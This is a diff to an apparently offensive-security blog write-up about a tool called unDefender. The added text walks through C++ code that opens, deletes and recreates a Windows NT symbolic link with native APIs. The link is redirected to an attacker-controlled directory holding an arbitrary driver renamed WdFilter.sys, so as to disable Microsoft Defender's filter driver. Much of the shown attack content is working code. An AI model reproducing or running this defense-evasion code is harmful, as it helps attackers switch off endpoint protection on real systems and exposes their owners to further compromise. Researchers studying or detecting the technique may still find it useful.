@@ -70,7 +70,9 @@ bool GetSystem()
 }
 ```
 #### Saving the symbolic link current state
-After getting SYSTEM we need to backup the current state of the symbolic link, so that we can programmatically restore it later. This is done through the GetSymbolicLinkTarget implemented in the GetSymbolicLinkTarget.cpp file. After resolving the address of the Nt functions (skipped in the following snippet) we initialize two key data structures: a UNICODE\_STRING and a OBJECT\_ATTRIBUTES
+After getting SYSTEM we need to backup the current state of the symbolic link, so that we can programmatically restore it later. This is done through the GetSymbolicLinkTarget implemented in the GetSymbolicLinkTarget.cpp file. After resolving the address of the Nt functions (skipped in the following snippet) we define two key data structures: a UNICODE\_STRING and an OBJECT\_ATTRIBUTES. These two are initialized through RtlInitUnicodeString and InitializeObjectAttributes. The UNICODE\_STRING is initialized using the symLinkName variable, which is of type std::wstring and is one of the arguments passed to GetSymbolicLinkTarget by the main function. The first one is a structure the Windows kernel uses to work with unicode strings (duh!) and is necessary for initializing the second one, which in turn is used to open a handle to the NT symlink using NtOpenSymbolicLinkObject with GENERIC\_READ access. Before that though we define a HANDLE which will be filled by NtOpenSymbolicLinkObject itself and that we will assign to the corresponding RAII type (I have yet to implement a way of doing it directly without using a temporary disposable variable, I'm lazy).
+
+Done that we proceed to initialize a second UNICODE\_STRING which will be used to store the symlink target retrieved by NtQuerySymbolicLinkObject, which takes as arguments the RAII::Handle we initialized before, the second UNICODE\_STRING we just initialized and a nullptr as we don't care about the bytes read. Done that we return the buffer of the second UNICODE\_STRING and call it a day.
 ```C++
 UNICODE_STRING symlinkPath;
 RtlInitUnicodeString(&symlinkPath, symLinkName.c_str());
@@ -99,23 +101,48 @@ return LinkTarget.Buffer;
 ```
 
 #### Changing the symbolic link
-First, we setup some data structures that will identify the symlink we want to target and then call the native function NtOpenSymbolicLink to get a handle to said symlink with DELETE privileges.
+Now that we have stored the older symlink target it's time we change it. To do so we once again setup the two UNICODE\_STRING and OBJECT\_ATTRIBUTES structures that will identify the symlink we want to target and then call the native function NtOpenSymbolicLink to get a handle to said symlink with DELETE privileges.
 
 ```C++
 UNICODE_STRING symlinkPath;
 RtlInitUnicodeString(&symlinkPath, symLinkName.c_str());
 OBJECT_ATTRIBUTES symlinkObjAttr{};
-InitializeObjectAttributes(&symlinkObjAttr, &symlinkPath, BJ_KERNEL_HANDLE, NULL, NULL);
+InitializeObjectAttributes(&symlinkObjAttr, &symlinkPath, OBJ_KERNEL_HANDLE, NULL, NULL);
 HANDLE symlinkHandle;
 
 NTSTATUS status = NtOpenSymbolicLinkObject(&symlinkHandle, DELETE, &symlinkObjAttr);
 ```
 
-After that, we proceed to delete the symlink. To do that we first have to call NtMakeTemporaryObject and pass it the handle to the symlink we got before. That's because this kind of symlinks are created with the OBJ_PERMANENT attribute, which increases the reference counter of the symlink object in the kernel by 1. This means that even if all handles to the symbolic link are closed, the symbolic link will continue to live in the kernel object manager. So, in order to delete it we have to make the object no longer permanent (hence temporary), which means NtMakeTemporaryObject simply decreases the reference counter by one. When we call CloseHandle after that on the handle of the symlink, the reference counter goes to zero and the object is destroyed:
+After that, we proceed to delete the symlink. To do that we first have to call NtMakeTemporaryObject and pass it the handle to the symlink we just got. That's because this kind of symlinks are created with the OBJ_PERMANENT attribute, which increases the reference counter of their kernel object in kernelspace by 1. This means that even if all handles to the symbolic link are closed, the symbolic link will continue to live in the kernel object manager. So, in order to delete it we have to make the object no longer permanent (hence temporary), which means NtMakeTemporaryObject simply decreases the reference counter by one. When we call CloseHandle after that on the handle of the symlink, the reference counter goes to zero and the object is destroyed:
 
 ```C++
 status = NtMakeTemporaryObject(symlinkHandle);
 CloseHandle(symlinkHandle);
 ```
 
-Once we have deleted the symlink it's time to recreate it and make it point
+Once we have deleted the symlink it's time to recreate it and make it point to the new target. This is done by initializing again a UNICODE\_STRING and a OBJECT\_ATTRIBUTES and calling NtCreateSymbolicLinkObject:
+```C++
+UNICODE_STRING target;
+RtlInitUnicodeString(&target, newDestination.c_str());
+UNICODE_STRING newSymLinkPath;
+RtlInitUnicodeString(&newSymLinkPath, symLinkName.c_str());
+OBJECT_ATTRIBUTES newSymLinkObjAttr{};
+InitializeObjectAttributes(&newSymLinkObjAttr, &newSymLinkPath, OBJ_CASE_INSENSITIVE | OBJ_PERMANENT, NULL, NULL);
+HANDLE newSymLinkHandle;
+
+status = NtCreateSymbolicLinkObject(&newSymLinkHandle, SYMBOLIC_LINK_ALL_ACCESS, &newSymLinkObjAttr, &target);
+if (status != STATUS_SUCCESS)
+{
+	std::wcout << L"[-] Couldn't create new symbolic link " << symLinkName << L" to " << newDestination << L". Error:0x" << std::hex << status << std::endl;
+	return status;
+}
+else std::wcout << L"[+] Symbolic link " << symLinkName << L" to " << newDestination << L" created!" << std::endl;
+CloseHandle(newSymLinkHandle);
+return STATUS_SUCCESS;
+```
+
+Note two things:
+1. when calling InitializeObjectAttributes we pass the OBJ_PERMANENT attribute as argument, so that the symlink is created as permanent, in order to avoid having the symlink destroyed when unDefender exits;
+2. right before returning STATUS_SUCCESS we call CloseHandle on the newly created symlink. This is necessary because if the handle stays open the reference counter of the symlink will be 2 (1 for the handle, plus 1 for the OBJ\_PERMANENT) and we won't be able to delete it later when we will try to restore the old symlink.  
+
+At this point the symlink is changed and points to a location we have control on. In this location we will have constructed a directory tree which mimicks WdFilter's one and copied our arbitrary driver, conveniently renamed WdFilter.sys - we do it in the first line of the main function through a series of system() function calls. I know it's uncivilized to do it this way, deal with it.
